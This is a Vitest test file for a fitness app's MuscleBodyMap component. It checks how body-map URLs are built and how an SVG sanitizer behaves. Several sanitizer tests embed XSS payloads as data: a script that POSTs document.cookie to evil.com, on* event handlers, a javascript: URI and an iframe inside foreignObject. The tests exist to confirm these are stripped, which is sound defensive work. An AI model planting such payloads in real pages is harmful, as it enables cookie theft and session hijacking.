/**
 * Tests for MuscleBodyMap component logic.
 *
 * This suite runs in the node environment (no jsdom), so rendering tests are
 * limited. The URL resolution logic and SVG sanitizer behavior are fully
 * covered here. For rendered state machine tests (loading/success/fallback
 * transitions), a jsdom environment is required.
 */

import { describe, it, expect } from 'vitest'
import { sanitizeSvg } from '@/lib/ymove/sanitize-svg'

// ── URL resolution logic ──────────────────────────────────────────────────────
// Mirrors the fetchUrl derivation in MuscleBodyMap (lines 79-83 of component).
// This function is not exported; testing the logic directly here keeps the
// component clean while giving us full coverage.

function deriveBodyMapUrl(
  ymoveId?: string | null,
  exerciseId?: string | null,
): string | null {
  if (ymoveId) return `/api/ymove/body-map/${encodeURIComponent(ymoveId)}`
  if (exerciseId) return `/api/ymove/body-map/by-exercise/${encodeURIComponent(exerciseId)}`
  return null
}

describe('MuscleBodyMap URL resolution', () => {
  const UUID = '65e95132-e6bb-41e8-af7d-0eda931a1693'
  const EX_ID = '0026'

  it('uses ymoveId route when ymoveId provided', () => {
    expect(deriveBodyMapUrl(UUID)).toBe(`/api/ymove/body-map/${UUID}`)
  })

  it('uses by-exercise route when only exerciseId provided', () => {
    expect(deriveBodyMapUrl(null, EX_ID)).toBe(`/api/ymove/body-map/by-exercise/${EX_ID}`)
    expect(deriveBodyMapUrl(undefined, EX_ID)).toBe(`/api/ymove/body-map/by-exercise/${EX_ID}`)
  })

  it('ymoveId takes precedence over exerciseId when both are provided', () => {
    const url = deriveBodyMapUrl(UUID, EX_ID)
    expect(url).toBe(`/api/ymove/body-map/${UUID}`)
    expect(url).not.toContain('by-exercise')
  })

  it('returns null when neither identifier is provided', () => {
    expect(deriveBodyMapUrl()).toBeNull()
    expect(deriveBodyMapUrl(null, null)).toBeNull()
    expect(deriveBodyMapUrl(undefined, undefined)).toBeNull()
  })

  it('returns null when ymoveId is empty string (falsy)', () => {
    expect(deriveBodyMapUrl('', EX_ID)).toBe(`/api/ymove/body-map/by-exercise/${EX_ID}`)
  })

  it('encodes special characters in ymoveId', () => {
    const url = deriveBodyMapUrl('id with spaces/slash')
    expect(url).toBe('/api/ymove/body-map/id%20with%20spaces%2Fslash')
  })

  it('encodes special characters in exerciseId', () => {
    const url = deriveBodyMapUrl(null, 'ex/id')
    expect(url).toBe('/api/ymove/body-map/by-exercise/ex%2Fid')
  })
})

// ── Sanitizer integration: realistic YMove SVG payloads ───────────────────────

const REALISTIC_SVG = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 72 93" role="img" aria-label="Muscles worked: Bench Press">
  <title>Bench Press — muscles worked</title>
  <g data-region="chest" fill="rgba(255,80,80,0.8)">
    <path d="M10 20 L30 20 L30 40 L10 40 Z"/>
  </g>
  <g data-region="front-delts" fill="rgba(255,80,80,0.2)">
    <circle cx="35" cy="25" r="8"/>
  </g>
  <g data-region="triceps" fill="rgba(255,80,80,0.07)">
    <rect x="50" y="20" width="15" height="20"/>
  </g>
</svg>`

describe('MuscleBodyMap SVG sanitizer — realistic YMove payload', () => {
  it('passes a clean realistic SVG through unchanged', () => {
    const result = sanitizeSvg(REALISTIC_SVG)
    expect(result).not.toBeNull()
    expect(result).toContain('<svg')
    expect(result).toContain('data-region="chest"')
    expect(result).toContain('data-region="front-delts"')
    expect(result).toContain('data-region="triceps"')
  })

  it('preserves role and aria-label for accessibility', () => {
    const result = sanitizeSvg(REALISTIC_SVG)
    expect(result).toContain('role="img"')
    expect(result).toContain('aria-label=')
  })

  it('preserves title element for screen reader support', () => {
    const result = sanitizeSvg(REALISTIC_SVG)
    expect(result).toContain('<title>')
  })

  it('preserves fill colors (required for muscle intensity highlighting)', () => {
    const result = sanitizeSvg(REALISTIC_SVG)
    expect(result).toContain('rgba(255,80,80,0.8)')
    expect(result).toContain('rgba(255,80,80,0.2)')
    expect(result).toContain('rgba(255,80,80,0.07)')
  })

  it('removes XML declaration if present (not needed for inline SVG)', () => {
    const withDecl = `<?xml version="1.0" encoding="UTF-8"?>\n${REALISTIC_SVG}`
    const result = sanitizeSvg(withDecl)
    expect(result).not.toBeNull()
    expect(result!.trim()).toMatch(/^<svg/)
    expect(result).not.toContain('<?xml')
  })

  it('returns null for non-SVG content (JSON body, empty string, etc.)', () => {
    expect(sanitizeSvg('')).toBeNull()
    expect(sanitizeSvg('{"error":"not found"}')).toBeNull()
    expect(sanitizeSvg('<html><body>hello</body></html>')).toBeNull()
    expect(sanitizeSvg('plain text')).toBeNull()
  })

  it('returns null for non-string input', () => {
    // Typed as string but defend against runtime surprises from upstream
    expect(sanitizeSvg(null as unknown as string)).toBeNull()
    expect(sanitizeSvg(undefined as unknown as string)).toBeNull()
    expect(sanitizeSvg(42 as unknown as string)).toBeNull()
  })

  it('strips <script> injection inside SVG', () => {
    const attacked = REALISTIC_SVG.replace('</svg>', '<script>fetch("//evil.com",{method:"POST",body:document.cookie})</script></svg>')
    const result = sanitizeSvg(attacked)
    expect(result).not.toBeNull()
    expect(result).not.toContain('<script')
    expect(result).not.toContain('evil.com')
    expect(result).toContain('data-region="chest"')
  })

  it('strips onclick and other on* event handlers', () => {
    const attacked = REALISTIC_SVG.replace('data-region="chest"', 'data-region="chest" onclick="xss()" onmouseover="xss()"')
    const result = sanitizeSvg(attacked)
    expect(result).not.toBeNull()
    expect(result).not.toContain('onclick')
    expect(result).not.toContain('onmouseover')
    expect(result).toContain('data-region="chest"')
  })

  it('strips xlink:href attribute', () => {
    const attacked = REALISTIC_SVG.replace('data-region="chest"', 'data-region="chest" xlink:href="#evil"')
    const result = sanitizeSvg(attacked)
    expect(result).not.toBeNull()
    expect(result).not.toContain('xlink:href')
  })

  it('strips javascript: URI', () => {
    const attacked = REALISTIC_SVG.replace('<title>', '<title><a href="javascript:alert(1)">')
    const result = sanitizeSvg(attacked)
    expect(result).not.toBeNull()
    expect(result).not.toContain('javascript:')
  })

  it('strips foreignObject elements entirely', () => {
    const attacked = REALISTIC_SVG.replace('</svg>', '<foreignObject><iframe src="https://evil.com"></iframe></foreignObject></svg>')
    const result = sanitizeSvg(attacked)
    expect(result).not.toBeNull()
    expect(result).not.toContain('foreignObject')
    expect(result).not.toContain('iframe')
    expect(result).toContain('data-region="chest"')
  })
})

// ── Regression: MuscleBodyMap module structure ────────────────────────────────

describe('MuscleBodyMap module exports', () => {
  it('exports MuscleBodyMap as a named export', async () => {
    // Verify the component file imports without error in node env.
    // Full render testing requires jsdom — see vitest.config.ts environment.
    const mod = await import('@/components/training/MuscleBodyMap')
    expect(typeof mod.MuscleBodyMap).toBe('function')
  })
})
